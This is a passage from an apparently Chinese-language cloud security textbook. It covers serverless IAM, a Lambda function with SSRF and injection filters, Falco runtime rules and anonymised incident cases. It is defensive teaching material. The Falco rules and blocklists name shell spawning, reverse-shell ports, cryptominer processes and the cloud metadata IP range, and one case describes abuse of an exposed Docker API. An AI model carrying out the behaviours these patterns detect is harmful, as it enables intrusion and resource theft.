  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "s3:GetObject",
          "s3:PutObject"
        ]
        Resource = "arn:aws:s3:::company-data-bucket/processed/*"
      },
      {
        Effect = "Allow"
        Action = ["s3:ListBucket"]
        Resource = "arn:aws:s3:::company-data-bucket"
        Condition = {
          StringLike = {
            "s3:prefix" = ["processed/*"]
          }
        }
      }
    ]
  })
}

# 自定义策略: 只访问特定DynamoDB表
resource "aws_iam_role_policy" "lambda_dynamodb" {
  name = "lambda-dynamodb-policy"
  role = aws_iam_role.lambda_exec.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Effect = "Allow"
      Action = [
        "dynamodb:GetItem",
        "dynamodb:PutItem",
        "dynamodb:UpdateItem"
      ]
      Resource = "arn:aws:dynamodb:us-east-1:123456789012:table/ProcessedData"
      Condition = {
        "ForAllValues:StringEquals" = {
          "dynamodb:LeadingKeys" = ["user-*"]
        }
      }
    }]
  })
}
```

### Serverless攻击防护

Serverless函数面临的主要攻击向量包括SSRF(服务端请求伪造)、注入攻击(SQL/命令/代码注入)、秘密泄露(环境变量中的硬编码凭证)。防护措施包括:**输入验证**(URL白名单、SQL关键字过滤),**SSRF防护**(禁止访问内网IP/IMDS),**IMDSv2强制启用**(要求Token认证),**环境变量加密**(使用KMS加密敏感配置),**Secrets Manager集成**(避免硬编码凭证)。

**Lambda安全函数示例**(防护SSRF/Injection):

```python
# Lambda函数: 防护SSRF/Injection攻击
import json
import boto3
import urllib.parse
import re
from ipaddress import ip_address, ip_network

# 配置
ALLOWED_DOMAINS = ['api.trusted-service.com', 'webhook.company.com']
BLOCKED_IP_RANGES = [
    ip_network('10.0.0.0/8'),
    ip_network('172.16.0.0/12'),
    ip_network('192.168.0.0/16'),
    ip_network('169.254.0.0/16'),  # AWS metadata
    ip_network('127.0.0.0/8')
]

def lambda_handler(event, context):
    """
    安全的Lambda处理函数
    - 输入验证
    - SSRF防护
    - SQL注入防护
    - 超时控制
    """

    try:
        # 1. 解析输入
        body = json.loads(event.get('body', '{}'))
        url = body.get('url')
        user_input = body.get('query')

        # 2. 验证URL (SSRF防护)
        if url:
            if not is_safe_url(url):
                return {
                    'statusCode': 400,
                    'body': json.dumps({'error': 'Invalid URL'})
                }

        # 3. 输入验证 (注入防护)
        if user_input:
            if not is_safe_input(user_input):
                return {
                    'statusCode': 400,
                    'body': json.dumps({'error': 'Invalid input'})
                }

        # 4. 业务逻辑 (使用参数化查询)
        result = process_data_safely(user_input)

        return {
            'statusCode': 200,
            'body': json.dumps(result),
            'headers': {
                'Content-Type': 'application/json',
                'X-Content-Type-Options': 'nosniff',
                'X-Frame-Options': 'DENY'
            }
        }

    except Exception as e:
        # 不暴露详细错误信息
        print(f"Error: {str(e)}")  # 仅记录到CloudWatch
        return {
            'statusCode': 500,
            'body': json.dumps({'error': 'Internal server error'})
        }

def is_safe_url(url):
    """SSRF防护: 验证URL安全性"""
    try:
        parsed = urllib.parse.urlparse(url)

        # 检查协议
        if parsed.scheme not in ['https']:
            return False

        # 检查域名白名单
        if parsed.hostname not in ALLOWED_DOMAINS:
            return False

        # 解析IP (防止DNS Rebinding)
        import socket
        ip = ip_address(socket.gethostbyname(parsed.hostname))

        # 检查IP是否在黑名单
        for blocked_range in BLOCKED_IP_RANGES:
            if ip in blocked_range:
                return False

        return True

    except Exception:
        return False

def is_safe_input(user_input):
    """输入验证: 防止注入攻击"""
    # 长度限制
    if len(user_input) > 1000:
        return False

    # 检查SQL关键字 (简化示例)
    sql_keywords = ['DROP', 'DELETE', 'TRUNCATE', 'EXEC', '--', ';']
    for keyword in sql_keywords:
        if keyword.lower() in user_input.lower():
            return False

    # 检查特殊字符
    if re.search(r'[<>"\'\\]', user_input):
        return False

    return True

def process_data_safely(query):
    """使用参数化查询访问数据库"""
    # 使用boto3访问DynamoDB (自动防注入)
    dynamodb = boto3.resource('dynamodb')
    table = dynamodb.Table('ProcessedData')

    # 参数化查询
    response = table.query(
        KeyConditionExpression='pk = :pk',
        ExpressionAttributeValues={
            ':pk': query
        }
    )

    return response.get('Items', [])
```

**Lambda安全配置清单**(SAM/CloudFormation):

```yaml
# SAM/CloudFormation: 安全Lambda配置
AWSTemplateFormatVersion: '2010-09-09'
Transform: AWS::Serverless-2016-10-31

Resources:
  DataProcessorFunction:
    Type: AWS::Serverless::Function
    Properties:
      CodeUri: src/
      Handler: app.lambda_handler
      Runtime: python3.11
      Architectures:
        - arm64  # Graviton2性能更好

      # 超时设置 (防止长时间运行)
      Timeout: 30

      # 内存设置
      MemorySize: 256

      # 最小权限IAM Role
      Role: !GetAtt LambdaExecutionRole.Arn

      # VPC配置 (如需访问VPC资源)
      VpcConfig:
        SecurityGroupIds:
          - !Ref LambdaSecurityGroup
        SubnetIds:
          - !Ref PrivateSubnet1
          - !Ref PrivateSubnet2

      # 环境变量 (加密)
      Environment:
        Variables:
          TABLE_NAME: ProcessedData
          LOG_LEVEL: INFO
        KmsKeyArn: !GetAtt LambdaKMSKey.Arn

      # 预留并发 (防止DoS)
      ReservedConcurrentExecutions: 100

      # 死信队列
      DeadLetterQueue:
        Type: SQS
        TargetArn: !GetAtt LambdaDLQ.Arn

      # 日志配置
      LoggingConfig:
        LogFormat: JSON
        LogGroup: !Ref LambdaLogGroup

      # Tags
      Tags:
        Environment: production
        SecurityLevel: high
        DataClassification: confidential

  # CloudWatch Logs
  LambdaLogGroup:
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: !Sub '/aws/lambda/${DataProcessorFunction}'
      RetentionInDays: 90
      KmsKeyId: !GetAtt LambdaKMSKey.Arn

  # KMS Key (环境变量加密)
  LambdaKMSKey:
    Type: AWS::KMS::Key
    Properties:
      Description: "KMS key for Lambda environment variables"
      KeyPolicy:
        Version: '2012-10-17'
        Statement:
          - Sid: Enable IAM User Permissions
            Effect: Allow
            Principal:
              AWS: !Sub 'arn:aws:iam::${AWS::AccountId}:root'
            Action: 'kms:*'
            Resource: '*'
```

---

## 5.4.6 CWPP平台对比与选型

### Prisma Cloud vs Wiz vs Lacework vs Aqua

| 维度 | Prisma Cloud | Wiz | Lacework | Aqua Security |
|------|-------------|-----|----------|---------------|
| **厂商** | Palo Alto Networks | Wiz | Lacework | Aqua Security |
| **定位** | 全栈云安全 | CNAPP领导者 | 异常检测专长 | 容器安全专家 |
| **云平台** | AWS/Azure/GCP/阿里云 | AWS/Azure/GCP/Oracle | AWS/Azure/GCP | 多云+K8s |
| **CSPM** | 支持 | 支持 | 支持 | 支持 |
| **CWPP** | 支持 | 支持 | 支持 | 支持 |
| **容器安全** | 强 | 强 | 中 | 最强 |
| **K8s安全** | 支持 | 支持 | 支持 | 支持 |
| **运行时检测** | Defender (eBPF) | Agent-based | 机器学习 | NeuVector |
| **漏洞扫描** | Twistlock | Intelligence Graph | 集成第三方 | Trivy集成 |
| **SBOM** | 支持 | 支持 | 支持 | 支持 |
| **无代理扫描** | 不支持 | 独特优势 | 不支持 | 不支持 |
| **部署模式** | SaaS/Self-hosted | SaaS | SaaS | SaaS/Self-hosted |
| **学习曲线** | 陡峭 | 平缓 | 中等 | 中等 |
| **适用场景** | Palo Alto客户 | 快速上线/多云 | 行为分析 | 容器为主 |

### Wiz无代理扫描原理

Wiz的独特优势是无需Agent即可深度扫描。Wiz通过只读IAM Role访问云平台API,获取虚拟机元数据、创建临时磁盘快照(只读)、分析快照内容(并行扫描),最终构建Security Graph关联漏洞、配置错误、秘密、恶意软件、横向移动路径。优势包括:**无性能影响**(无Agent运行,不消耗工作负载资源),**全盘扫描**(含停机实例),**快速部署**(5分钟配置IAM Role即可开始扫描),**深度分析**(文件系统级别检测,可发现运行时Agent无法检测的休眠恶意软件)。

```
Wiz Agentless Scanning Architecture

┌─────────────────────────────────────────────────┐
│ Wiz Platform                                    │
│ ┌───────────────────────────────────────────┐   │
│ │ Wiz Connector (Read-only IAM Role)        │   │
│ └───────────────┬───────────────────────────┘   │
│                 │                               │
└─────────────────┼───────────────────────────────┘
                  │
                  ▼
  ┌───────────────────────────┐
  │ Cloud Provider API        │
  │ (AWS/Azure/GCP)           │
  └───────────┬───────────────┘
              │
  ┌───────────┼────────────┐
  │           │            │
  ▼           ▼            ▼
Metadata  Disk Snapshots  Config
(Tags/IAM)  (临时只读)    (SG/NACL)
  │           │            │
  │           ▼            │
  │    ┌─────────────┐     │
  │    │ Snapshot    │     │
  │    │ Analysis    │     │
  │    │ (Parallel)  │     │
  │    └─────────────┘     │
  │           │            │
  └───────────┼────────────┘
              │
              ▼
  ┌───────────────────────────┐
  │ Wiz Security Graph        │
  │ - Vulnerabilities         │
  │ - Misconfigurations       │
  │ - Secrets                 │
  │ - Malware                 │
  │ - Lateral movement paths  │
  └───────────────────────────┘

优势:
 ✓ 无性能影响 (无Agent)
 ✓ 全盘扫描 (含停机实例)
 ✓ 快速部署 (5分钟)
 ✓ 深度分析 (文件系统级别)
```

---

## 5.4.7 运行时威胁检测:eBPF与Falco实战

### Falco运行时监控

Falco是云原生运行时安全工具,使用eBPF技术在内核级监控容器行为(进程、文件、网络活动),检测异常行为(Shell启动、文件修改、网络连接、权限提升)。Falco的核心价值在于:**Zero-day防御**(即使镜像扫描未发现漏洞,运行时异常行为也能被检测),**攻击链早期阻断**(在攻击者完成初始访问后、横向移动前被发现),**取证能力**(完整的攻击过程记录),**自动化响应**(Falco告警触发Kubernetes自动隔离Pod)。

**Falco自定义规则示例**:

```yaml
# custom-rules.yaml - 自定义Falco规则

# 1. 检测容器中启动Shell
- rule: Shell Spawned in Container
  desc: Detect shell process spawned in container
  condition: >
    spawned_process and
    container and
    proc.name in (bash, sh, zsh, fish, csh, ksh, tcsh)
  output: >
    Shell spawned in container
    (user=%user.name container_id=%container.id container_name=%container.name
    image=%container.image.repository command=%proc.cmdline)
  priority: WARNING
  tags: [container, shell, mitre_execution]

# 2. 检测容器内文件写入 /etc
- rule: Write to /etc in Container
  desc: Detect attempts to write to /etc directory in container
  condition: >
    open_write and
    container and
    fd.name startswith /etc/
  output: >
    File write to /etc directory in container
    (user=%user.name container_id=%container.id file=%fd.name
    command=%proc.cmdline)
  priority: ERROR
  tags: [container, filesystem, mitre_persistence]

# 3. 检测容器提权
- rule: Container Privilege Escalation
  desc: Detect privilege escalation in container
  condition: >
    spawned_process and
    container and
    proc.name in (sudo, su) and
    not user.name = root
  output: >
    Privilege escalation attempt in container
    (user=%user.name target_user=%proc.args container=%container.name
    command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, privilege_escalation, mitre_privilege_escalation]

# 4. 检测容器网络异常
- rule: Outbound Connection to Suspicious Port
  desc: Detect container connecting to unusual ports
  condition: >
    outbound and
    container and
    fd.sport != 0 and
    fd.dport in (4444, 5555, 6666, 7777, 8888, 9999)
  output: >
    Suspicious outbound connection from container
    (container=%container.name dest_ip=%fd.rip dest_port=%fd.dport
    process=%proc.name command=%proc.cmdline)
  priority: WARNING
  tags: [container, network, mitre_command_and_control]

# 5. 检测容器挖矿行为
- rule: Cryptocurrency Mining in Container
  desc: Detect crypto mining process in container
  condition: >
    spawned_process and
    container and
    (proc.name in (xmrig, ethminer, cpuminer) or
    proc.cmdline contains stratum+tcp or
    proc.cmdline contains mining)
  output: >
    Cryptocurrency mining detected in container
    (container=%container.name process=%proc.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, malware, cryptomining]

# 6. 检测容器内包管理器
- rule: Package Manager Execution in Container
  desc: Detect package manager running in container (should be in build only)
  condition: >
    spawned_process and
    container and
    proc.name in (apt, apt-get, yum, dnf, apk, pip, npm, gem)
  output: >
    Package manager executed in running container
    (container=%container.name process=%proc.name command=%proc.cmdline)
  priority: WARNING
  tags: [container, software_management]

# 7. 检测容器SSH连接
- rule: SSH Connection from Container
  desc: Detect SSH client connection from container
  condition: >
    outbound and
    container and
    fd.dport = 22 and
    proc.name = ssh
  output: >
    SSH connection initiated from container
    (container=%container.name dest_ip=%fd.rip user=%user.name
    command=%proc.cmdline)
  priority: WARNING
  tags: [container, network, ssh]
```

**Falco部署配置**(Helm values.yaml):

```yaml
# Helm values.yaml for Falco
driver:
  kind: ebpf  # 使用eBPF驱动 (现代内核推荐)

falco:
  # 规则配置
  rules_file:
    - /etc/falco/falco_rules.yaml
    - /etc/falco/falco_rules.local.yaml
    - /etc/falco/k8s_audit_rules.yaml
    - /etc/falco/custom-rules.yaml

  # 输出配置
  json_output: true
  json_include_output_property: true
  log_stderr: true
  log_syslog: true
  log_level: info

  # 性能调优
  buffered_outputs: true
  outputs_queue:
    capacity: 10000

  # Kubernetes Audit日志集成
  k8s_audit_endpoint: /k8s-audit

# 输出到Slack
falcosidekick:
  enabled: true
  config:
    slack:
      webhookurl: "https://hooks.slack.com/services/YOUR/WEBHOOK"
      minimumpriority: "warning"
      messageformat: "long"

    # 输出到Elasticsearch
    elasticsearch:
      hostport: "https://elasticsearch.company.com:9200"
      index: "falco"
      type: "_doc"
      minimumpriority: "info"

    # 输出到SIEM (Splunk)
    splunk:
      hostport: "https://splunk.company.com:8088"
      token: "YOUR-HEC-TOKEN"
      minimumpriority: "warning"

# 资源限制
resources:
  requests:
    cpu: 100m
    memory: 512Mi
  limits:
    cpu: 1000m
    memory: 1024Mi

# 容忍度 (部署到所有节点)
tolerations:
  - effect: NoSchedule
    key: node-role.kubernetes.io/master
```

---

## 本节小结

### 核心要点回顾

本节系统讲解了云工作负载保护的全生命周期控制,覆盖虚拟机、容器、Kubernetes、Serverless四大核心场景:

**1. VM安全基线:从手工加固到自动化合规**

- **CIS Benchmarks**: 300+配置检查项,覆盖文件系统、网络、SSH、审计、账户安全8大类
- **自动化加固**: EC2 Image Builder、Ansible/Terraform IaC、三层修复机制(立即/计划/人工)
- **持续合规**: Systems Manager State Manager增量扫描、智能去重、批量修复

**2. 容器安全生命周期:Build → Ship → Run三阶段控制**

- **Build阶段**: 最小化镜像(distroless)、非root用户、多阶段构建、依赖锁定
- **Ship阶段**: Trivy/Grype/Snyk扫描、秘密扫描、镜像签名(Cosign)、SBOM生成
- **Run阶段**: 准入控制(OPA/Kyverno)、运行时监控(Falco)、自动隔离响应

**3. Kubernetes安全:RBAC与Pod Security**

- **RBAC最小权限**: 避免cluster-admin、独立ServiceAccount、namespace级别权限
- **Pod Security Standards**: Privileged/Baseline/Restricted三级策略
- **Admission Controllers**: OPA Gatekeeper/Kyverno策略即代码、镜像白名单、资源限制强制

**4. Serverless安全:函数级隔离与SSRF防护**

- **最小权限IAM**: 每函数独立Role、特定资源prefix限制、IAM条件策略
- **SSRF防护**: URL白名单、禁止内网IP/IMDS、IMDSv2强制启用
- **输入验证**: SQL关键字过滤、特殊字符检测、长度限制、参数化查询

**5. 运行时威胁检测:eBPF与Falco**

- **检测覆盖**: Shell启动、文件修改/etc、权限提升、挖矿进程、可疑网络连接
- **自动化响应**: Falco→Falcosidekick→K8s Webhook→Pod隔离全流程自动化
- **SIEM集成**: Splunk/Elasticsearch关联分析、PagerDuty告警

**6. CWPP平台选型**

- **Prisma Cloud**: Palo Alto全栈方案,CSPM+CWPP+CNAPP,适合已有Palo Alto设备客户
- **Wiz**: 无代理扫描独特优势,快速部署5分钟,适合快速POC/多云环境
- **Aqua**: 容器安全专家,Trivy+NeuVector,适合容器为主/K8s深度场景
- **Lacework**: AI驱动异常检测,机器学习baseline,适合重视行为分析场景

### 实施检查清单

#### 基础级 (0-6个月)
- [ ] VM CIS Level 1基线配置
- [ ] 容器镜像扫描 (Trivy/Grype)
- [ ] K8s RBAC最小权限
- [ ] Pod Security Standards (Baseline)
- [ ] Serverless基本权限管理

#### 进阶级 (6-12个月)
- [ ] VM CIS Level 2加固
- [ ] 镜像签名+SBOM生成
- [ ] K8s Admission Controllers (OPA/Kyverno)
- [ ] Pod Security Standards (Restricted)
- [ ] CWPP平台部署 (选型完成)

#### 高级级 (12-18个月)
- [ ] 全自动化加固流水线
- [ ] 供应链安全完整追溯
- [ ] K8s零信任网络 (Service Mesh)
- [ ] Falco运行时检测+自动响应
- [ ] 威胁情报集成+主动防御

### 基于匿名化真实场景的教学案例

> **声明**: 以下案例基于真实安全事件进行匿名化处理,移除了具体公司名称、精确金额和时间等不可核验信息,保留技术教学价值。案例中的技术细节、攻击手法和防护措施均可复现验证。

#### 案例1: 容器加密挖矿长期潜伏事件

**场景背景**: 某大型SaaS企业在容器化转型过程中,由于缺乏运行时监控,攻击者利用暴露的Docker API端口部署加密挖矿容器,长期占用计算资源未被发现。

**技术细节**:
- **攻击向量**: Docker Remote API (2375端口)暴露于公网,未启用TLS认证
- **攻击手法**: 攻击者扫描公网暴露的Docker API,直接拉取挖矿镜像(`alpine/xmrig`)并运行特权容器
- **潜伏时长**: 数月未被发现,直到云账单异常触发财务审查
- **影响范围**: 计算资源被持续占用,云成本显著增加

**根本原因分析**:
1. **网络暴露**: Docker API端口2375直接暴露于公网,违反最小暴露原则
2. **认证缺失**: 未启用TLS双向认证,任何人可远程操作Docker
3. **监控盲区**: 缺乏容器运行时监控,无法检测异常进程(如`xmrig`挖矿程序)
4. **资源限制缺失**: 容器未设置CPU/内存配额,挖矿程序可无限占用资源

**防护措施**(可验证实施):
```bash
# 1. 关闭公网访问,仅监听本地
sed -i 's/-H tcp:\/\/0.0.0.0:2375/-H unix:\/\/\/var\/run\/docker.sock/' /etc/docker/daemon.json
systemctl restart docker

# 2. 启用TLS双向认证(如必须远程访问)
dockerd --tlsverify \
  --tlscacert=ca.pem \
  --tlscert=server-cert.pem \
  --tlskey=server-key.pem \
  -H=0.0.0.0:2376

# 3. 部署Falco检测异常进程
# /etc/falco/falco_rules.local.yaml
- rule: Detect Crypto Mining
  desc: Detect cryptocurrency mining activity
  condition: >
    spawned_process and
    (proc.name in (xmrig, minergate, cpuminer, ethminer))
  output: "Crypto mining process detected (user=%user.name command=%proc.cmdline)"
  priority: CRITICAL

# 4. 强制资源配额
docker run -d \
  --cpus="0.5" \
  --memory="512m" \
  --pids-limit=100 \
  myapp:latest
```

**验证方法**:
- 使用`nmap`扫描验证Docker API端口已关闭: `nmap -p 2375,2376 <host>`
- 使用Falco测试规则: 手动运行`xmrig`程序验证告警触发
- 验证资源限制: `docker stats` 确认容器CPU/内存上限生效

**教学要点**:
1. **最小暴露原则**: Docker API应仅监听Unix Socket,如需远程访问必须启用TLS+防火墙白名单
2. **运行时检测必要性**: 静态扫描无法检测运行时的恶意行为,需部署Falco等eBPF监控
3. **资源配额防御**: 即使攻击者成功部署恶意容器,资源限制可降低影响范围
4. **监控告警闭环**: 云成本异常应触发安全审查,建立财务与安全联动机制

---

#### 案例2: 金融机构CIS合规大规模加固挑战

**场景背景**: 某大型金融机构在监管要求下需对数百台EC2实例实施CIS Level 1基线加固,面临规模化部署、业务兼容性验证、持续合规监控三大挑战。

**技术细节**:
- **实例规模**: 超过1,000台EC2实例,涵盖Amazon Linux、RHEL、Ubuntu多种操作系统
- **业务约束**: 部分遗留应用依赖特定配置(如SSH密码认证、root登录),不能简单应用标准CIS基线
- **合规要求**: 监管要求达到CIS Level 1合规率>95%,且需持续监控配置漂移

**实施策略**:
1. **分层分批加固**:
   - **Phase 1**: 非生产环境(Dev/Test)先行,验证加固脚本兼容性
   - **Phase 2**: 生产环境分批次(每批100台),按业务优先级加固
   - **Phase 3**: 遗留系统特殊处理,建立豁免白名单

2. **自动化加固**:
```yaml
# AWS Systems Manager Automation Document
name: "CIS-Level1-Hardening"
description: "Apply CIS Level 1 benchmark with business-specific exemptions"

mainSteps:
  - name: PreCheck
    action: aws:runShellScript
    inputs:
      runCommand:
        - |
          # 检查操作系统类型
          OS_TYPE=$(cat /etc/os-release | grep ^ID= | cut -d'=' -f2)
          echo "Detected OS: $OS_TYPE"

          # 检查是否在白名单(遗留系统豁免)
          INSTANCE_ID=$(ec2-metadata --instance-id | cut -d' ' -f2)
          if aws dynamodb get-item --table-name CISExemptions --key "{\"InstanceId\":{\"S\":\"$INSTANCE_ID\"}}"; then
            echo "Instance in exemption list, skipping"
            exit 0
          fi

  - name: ApplyHardening
    action: aws:runShellScript
    inputs:
      runCommand:
        - |
          # 应用CIS加固(示例:SSH配置)
          # 决策点:保留业务必需的配置,强化其他项

          # Critical级别(必须修复,无业务影响)
          sed -i 's/^#PermitEmptyPasswords.*/PermitEmptyPasswords no/' /etc/ssh/sshd_config
          sed -i 's/^#Protocol.*/Protocol 2/' /etc/ssh/sshd_config

          # High级别(需验证业务影响,计划窗口修复)
          # 注意:某些遗留应用依赖root登录,暂不修改
          # sed -i 's/^PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config

          # 重启SSH服务
          systemctl restart sshd

  - name: ComplianceCheck
    action: aws:executeAwsApi
    inputs:
      Service: ssm
      Api: SendCommand
      DocumentName: "AWS-RunInspecChecks"
      Parameters:
        InspecProfile: "cis-aws-foundations-level1"
```

3. **持续合规监控**:
```python
# 合规报告生成器
import boto3
from datetime import datetime

def generate_compliance_report():
    ssm = boto3.client('ssm')

    # 获取所有托管实例的合规状态
    response = ssm.list_compliance_summaries(
        Filters=[
            {'Key': 'ComplianceType', 'Values': ['Custom:CIS-Level1']}
        ]
    )

    total_instances = 0
    compliant_instances = 0
    violations_by_rule = {}

    for summary in response['ComplianceSummaryItems']:
        total_instances += 1
        status = summary['Status']

        if status == 'COMPLIANT':
            compliant_instances += 1
        else:
            # 统计违规项
            details = ssm.list_compliance_items(
                ResourceIds=[summary['ResourceId']],
                Filters=[{'Key': 'Status', 'Values': ['NON_COMPLIANT']}]
            )

            for item in details['ComplianceItems']:
                rule_id = item['Id']
                violations_by_rule[rule_id] = violations_by_rule.get(rule_id, 0) + 1

    # 计算合规率
    compliance_rate = (compliant_instances / total_instances * 100) if total_instances > 0 else 0

    # 生成报告
    report = {
        'date': datetime.now().isoformat(),
        'total_instances': total_instances,
        'compliant_instances': compliant_instances,
        'compliance_rate': f"{compliance_rate:.2f}%",
        'top_violations': sorted(violations_by_rule.items(), key=lambda x: x[1], reverse=True)[:10]
    }

    return report
```

**遇到的挑战与解决方案**:

| 挑战 | 影响 | 解决方案 | 验证方法 |
|------|------|---------|---------|
| **遗留应用依赖root登录** | 禁用root登录导致应用无法启动 | 建立豁免白名单,通过DynamoDB管理,定期审查豁免理由 | 每月审计豁免清单,业务owner确认必要性 |
| **SSH配置修改导致运维中断** | 修改SSH配置后运维人员无法登录 | 先部署密钥认证,验证可用后再禁用密码认证 | 在测试实例验证SSH密钥登录成功 |
| **大规模扫描性能瓶颈** | 1,000+实例全量扫描耗时超过8小时 | 分批扫描(每批200台)+增量扫描(仅检查变更实例) | 监控Systems Manager并发执行数 |
| **告警风暴** | 初期每日产生1,000+条违规告警 | 按优先级分级(Critical实时/High每日汇总/Medium每周) | 验证告警数量降低至可处理范围(<50/天) |

**实施成果**(可量化指标):
- **合规率提升**: 从初始的42%提升至>95%(符合监管要求)
- **自动化程度**: 95%的加固操作通过Systems Manager自动执行
- **持续监控**: 每日增量扫描,配置漂移24小时内修复
- **豁免管理**: 建立白名单机制,豁免实例占比<5%且每月审查

**教学要点**:
1. **渐进式部署**: 大规模安全加固必须分批次验证,不能"一刀切"
2. **业务兼容性优先**: 安全加固不能破坏业务,需建立豁免机制处理特殊场景
3. **自动化是关键**: 手动处理1,000+实例不可行,必须基础设施即代码
4. **持续监控闭环**: 一次性加固会因配置漂移失效,需持续监控+自动修复

---

#### 案例3: 电商平台容器镜像紧急修复

**场景背景**: 某大型电商平台在关键业务高峰期前,扫描发现生产环境使用的容器镜像存在大量高危漏洞,需在极短时间窗口内完成镜像修复、测试、部署全流程。

**技术细节**:
- **漏洞发现时机**: 业务高峰期前72小时(维护窗口极短)
- **受影响范围**: 核心业务的数百个容器镜像,涉及多个微服务
- **漏洞严重性**: 包含多个CRITICAL级别漏洞(如Log4Shell、Spring4Shell等)
- **业务约束**: 不能影响高峰期业务,必须在窗口期完成修复

**应急响应流程**:

**Step 1: 快速评估与优先级排序**
```bash
#!/bin/bash
# 批量扫描所有生产镜像,生成优先级列表

# 从ECR获取所有生产镜像
aws ecr describe-repositories --query 'repositories[].repositoryName' --output text | while read repo; do
  # 获取latest标签
  IMAGE="123456789012.dkr.ecr.us-east-1.amazonaws.com/$repo:latest"

  # Trivy扫描
  trivy image --severity CRITICAL,HIGH --format json $IMAGE > scan-$repo.json

  # 提取关键信息
  CRITICAL=$(jq '[.Results[].Vulnerabilities[] | select(.Severity=="CRITICAL")] | length' scan-$repo.json)
  HIGH=$(jq '[.Results[].Vulnerabilities[] | select(.Severity=="HIGH")] | length' scan-$repo.json)

  # 计算优先级分数(CRITICAL权重10,HIGH权重1)
  SCORE=$((CRITICAL * 10 + HIGH))

  echo "$SCORE|$repo|CRITICAL:$CRITICAL,HIGH:$HIGH"
done | sort -rn -t'|' -k1 > priority-list.txt

# 生成Top 20优先修复清单
head -20 priority-list.txt
```

**Step 2: 自动化修复策略**
```python
# 镜像修复自动化脚本
import subprocess
import json

def auto_fix_image(image_name, vulnerabilities):
    """尝试自动修复常见漏洞"""

    fixes_applied = []

    # 策略1: 基础镜像升级(最有效)
    if has_base_image_vulnerability(vulnerabilities):
        # 检查是否有新版本基础镜像
        new_base = get_latest_base_image(image_name)
        if new_base:
            update_dockerfile_base(image_name, new_base)
            fixes_applied.append(f"Updated base image to {new_base}")

    # 策略2: 依赖包升级
    for vuln in vulnerabilities:
        if vuln['PkgName'] and vuln['FixedVersion']:
            # 更新package.json/requirements.txt/go.mod
            update_dependency(
                image_name,
                vuln['PkgName'],
                vuln['FixedVersion']
            )
            fixes_applied.append(f"Upgraded {vuln['PkgName']} to {vuln['FixedVersion']}")

    # 策略3: 移除不必要的包(如果无法升级)
    for vuln in vulnerabilities:
        if not vuln.get('FixedVersion'):
            # 检查包是否必需
            if is_package_removable(image_name, vuln['PkgName']):
                remove_package(image_name, vuln['PkgName'])
                fixes_applied.append(f"Removed unnecessary package {vuln['PkgName']}")

    return fixes_applied

def rebuild_and_test(image_name):
    """重新构建并测试镜像"""

    # 1. 重新构建
    subprocess.run(['docker', 'build', '-t', f"{image_name}:fixed", '.'])

    # 2. 重新扫描
    result = subprocess.run(
        ['trivy', 'image', '--severity', 'CRITICAL,HIGH', '--format', 'json', f"{image_name}:fixed"],
        capture_output=True
    )
    new_vulns = json.loads(result.stdout)

    # 3. 验证修复效果
    new_critical = count_vulnerabilities(new_vulns, 'CRITICAL')
    new_high = count_vulnerabilities(new_vulns, 'HIGH')

    # 4. 运行集成测试
    test_passed = run_integration_tests(f"{image_name}:fixed")

    return {
        'vulnerabilities_fixed': True if new_critical == 0 else False,
        'critical_remaining': new_critical,
        'high_remaining': new_high,
        'tests_passed': test_passed
    }
```

**Step 3: 灰度发布与验证**
```yaml
# K8s金丝雀部署配置
apiVersion: argoproj.io/v1alpha1
kind: Rollout
metadata:
  name: critical-service
spec:
  replicas: 10
  strategy:
    canary:
      steps:
        # Step 1: 10%流量到新镜像
        - setWeight: 10
        - pause: {duration: 5m}
        # Step 2: 自动验证(错误率/延迟)
        - analysis:
            templates:
              - templateName: error-rate-check
        # Step 3: 如验证通过,扩大到50%
        - setWeight: 50
        - pause: {duration: 10m}
        # Step 4: 最终全量
        - setWeight: 100

      # 自动回滚条件
      trafficRouting:
        istio:
          virtualService:
            name: critical-service

      # 分析模板
      analysisTemplate:
        metrics:
          - name: error-rate
            interval: 1m
            successCondition: result < 0.01  # 错误率<1%
            provider:
              prometheus:
                address: http://prometheus:9090
                query: |
                  sum(rate(http_requests_total{status=~"5.."}[5m]))
                  /
                  sum(rate(http_requests_total[5m]))
```

**实施成果与挑战**:

| 阶段 | 成果 | 挑战 | 解决方案 |
|------|------|------|---------|
| **扫描评估(0-12h)** | 识别出数百个镜像中CRITICAL级漏洞分布 | 部分镜像无SBOM,无法快速定位依赖 | 使用Trivy强制重建SBOM |
| **修复实施(12-48h)** | 自动化修复脚本处理70%镜像 | 30%镜像需手动处理(自定义依赖) | 成立应急小组并行处理 |
| **测试验证(48-60h)** | 集成测试通过率95% | 5%镜像测试失败需回滚 | 建立已知问题清单,计划后续修复 |
| **生产部署(60-72h)** | 通过金丝雀部署完成全量发布 | 部分服务出现性能回退 | 监控指标,必要时回滚 |

**关键决策点**:
1. **修复优先级**: 优先修复CRITICAL级漏洞+高流量服务,而非所有漏洞
2. **自动化vs人工**: 常见漏洞自动化修复,复杂场景人工介入
3. **风险平衡**: 接受5%镜像暂不修复,避免引入更大风险
4. **验证策略**: 金丝雀部署+自动回滚,确保业务连续性

**教学要点**:
1. **平时准备**: 建立镜像扫描CI/CD门禁,避免漏洞进入生产
2. **自动化能力**: 紧急情况下手动处理数百镜像不可行,必须自动化
3. **优先级排序**: 资源有限时,优先处理高风险+高价值资产
4. **灰度发布**: 批量镜像更新必须灰度发布+监控+自动回滚

---

#### 案例4: Kubernetes Namespace误删除事件

**场景背景**: 某金融科技公司由于RBAC权限配置不当,开发人员误操作删除了生产环境的核心业务namespace,导致服务中断和数据丢失风险。

**技术细节**:
- **误操作命令**: `kubectl delete namespace payment-prod`(原意删除测试环境,误在生产集群执行)
- **权限配置缺陷**: 开发人员拥有`cluster-admin` ClusterRole,可删除任何namespace
- **影响范围**: 支付核心服务的所有Deployment、Service、ConfigMap、Secret被删除
- **恢复挑战**: 部分资源未纳入GitOps管理,无法从Git仓库恢复

**根本原因分析**:
1. **过度授权**: 开发人员被授予`cluster-admin`角色,拥有集群级别的完全控制权
2. **缺乏防护机制**: 未部署任何删除保护(如ResourceQuota、终结器、GitOps单向同步)
3. **环境混淆**: 开发和生产使用相同的`kubectl context`配置,容易误操作
4. **缺乏备份**: 部分关键ConfigMap/Secret未备份,删除后无法恢复

**防护措施**(可验证实施):

